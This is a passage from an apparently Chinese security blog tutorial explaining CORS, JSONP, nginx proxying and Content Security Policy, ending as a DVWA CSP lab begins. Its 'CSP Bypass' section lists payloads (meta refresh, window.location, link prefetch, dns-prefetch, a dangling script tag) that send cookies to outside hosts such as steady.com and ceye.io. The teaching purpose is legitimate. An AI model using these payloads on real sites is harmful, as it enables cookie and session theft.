title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h6><p>该字段是必须的，它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p><h6 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h6><p>该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。</p><h6 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a>Access-Control-Expose-Headers</h6><p>该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><h6 id="简单请求-1"><a href="#简单请求-1" class="headerlink" title="简单请求"></a>简单请求</h6><p>两个网站—<a href="http://www.siam.com和www.siam2.com/">www.siam.com和www.siam2.com</a> sim向sim2发起请求 </p><p>sim网站如下,使用ajax请求sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是原始页面的内容<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>访问sim2的时候:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</span><br></pre></td></tr></table></figure><p>很明显不允许进行跨域</p><p>因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置:</p><p><strong>响应头中增加字段，来添加信任站点的域名</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">header</span>(&#x27;<span class="attr">Access-Control-Allow-Origin:http:</span>//<span class="attr">www.siam.com</span>&#x27;);</span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>这里就跨域请求成功了。</p><h6 id="非简单请求-1"><a href="#非简单请求-1" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用<code>PUT</code>方法来测试就可以出现<code>非简单请求</code>的场景了。<br> 当然你也可以自定义HTTP头部来实现非简单请求。</p><p>我们把index.html的ajax方法改为<code>put</code> 然后请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : &quot;http://www.siam2.com/index2.php&quot;,</span><br><span class="line">    type: &quot;PUT&quot;,</span><br><span class="line">    success:function(res)&#123;</span><br><span class="line">        $(&#x27;body&#x27;).html(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到在请求中，我们填的是<code>PUT</code>，但是这里产生的却是<code>OPTIONS</code>，前面我们也说了，<code>非简单请求</code>会先产生一次<code>预检请求</code>，带上origin和真实的方法<code>在这里是PUT</code>，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法<code>PUT</code>发送一次请求。</p><p>我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。</p><p>我们在服务端的代码添加头部</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>); <span class="comment">// 需要同意两种类型，就用逗号隔开</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。</p><p>我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。</p><p>所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。</p><p>还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 如果不是同意的来源 就不用运行了</span></span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>], <span class="string">&#x27;http://www.siam.com&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line"><span class="comment">// 如果是预检请求，则通知信任即可，不需要执行脚本。</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;OPTIONS&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本</p><p>同时我们可以看一下，是否每一个<code>非简单请求</code>都需要先发送预检请求。我们在一个页面连续请求两次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">    type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">    success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">            type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现浏览器只有请求了3次：1次OPTIONS，2次PUT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一个页面中，预检操作只需要进行一次。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</span><br><span class="line">支持所有类型的 HTTP 请求。</span><br><span class="line">缺点</span><br><span class="line">第一次发送非简单请求时会多一次请求，增加服务器压力。</span><br></pre></td></tr></table></figure><h5 id="JSONP-跨域解决"><a href="#JSONP-跨域解决" class="headerlink" title="JSONP 跨域解决"></a>JSONP 跨域解决</h5><p>通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://steady.com/data.php?callback=steady&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params">jsondata</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//处理获得的json数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>首先我们在html中写下以下代码，创建一个script，调用动态脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Siam - script 同源解决&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;这是原始页面的内容&lt;/h1&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="comment">// 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).append(text);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;body&quot;</span>).append(<span class="string">&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\/script&gt;&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>服务端脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test(&#39;这是返回内容&#39;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>优点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。</span><br></pre></td></tr></table></figure><p>缺点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。</span><br></pre></td></tr></table></figure><h5 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h5><p>除了使用以上的两种方案，我们还可以在nginx配置反向代理，在<code>www.siam.com</code>下某个路径代理到<code>www.siam2.com</code>即可</p><p>我们打开nginx.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  www.siam.com;</span><br><span class="line">    <span class="comment">#charset koi8-r;</span></span><br><span class="line">    <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /apis &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://www.siam2.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反向代理，我们就可以通过 <a href="https://links.jianshu.com/go?to=http://www.siam.com/apis/index2.php">www.siam.com/apis/index2.php</a> 这个路径来访问原来部署在<a href="https://links.jianshu.com/go?to=http://www.siam2.com">www.siam2.com</a>下的内容。<br> 这样子就是同源请求了。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>​    CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。</p><h4 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h4><h5 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h5><p>一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><h5 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a>&lt;meta&gt;</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">脚本：只信任当前域名</span><br><span class="line">&lt;object&gt;标签：不信任任何URL，即不加载任何资源</span><br><span class="line">样式表：只信任cdn.example.org和third-party.org</span><br><span class="line">框架（frame）：必须使用HTTPS协议加载</span><br><span class="line">其他资源：没有限制</span><br></pre></td></tr></table></figure><h4 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h4><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><h4 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h4><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.<a href="http://foo.com/">foo.com</a></td><td>允许加载<a href="http://foo.com/">foo.com</a>子域的资源</td></tr><tr><td><a href="http://abc.foo.com/">abc.foo.com</a></td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; steady.foo.com</span><br></pre></td></tr></table></figure><p>默认的内容源必须为同源或者是steady.foo.com</p><h4 id="nonce-script-CSP和strict-dynamic"><a href="#nonce-script-CSP和strict-dynamic" class="headerlink" title="nonce script CSP和strict-dynamic"></a>nonce script CSP和strict-dynamic</h4><h5 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;</span>.$random.<span class="string">&quot; &#x27;&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce=<span class="string">&quot;&lt;?php echo $random?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h5 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39;</span><br></pre></td></tr></table></figure><h4 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h4><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><h6 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h6><p>在default-src ‘none‘的情况下，可以使用meta标签实现跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下</p><ul><li><p>用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>&lt;a&gt;标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  $(#foo).click()</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用网站本身的跳转接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com</span><br></pre></td></tr></table></figure></li></ul><h6 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a>&lt;link&gt;标签预加载</h6><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</span><br></pre></td></tr></table></figure><p>插入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="DVWA-CSP靶场"><a href="#DVWA-CSP靶场" class="headerlink" title="DVWA-CSP靶场"></a>DVWA-CSP靶场</h1><h4 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script 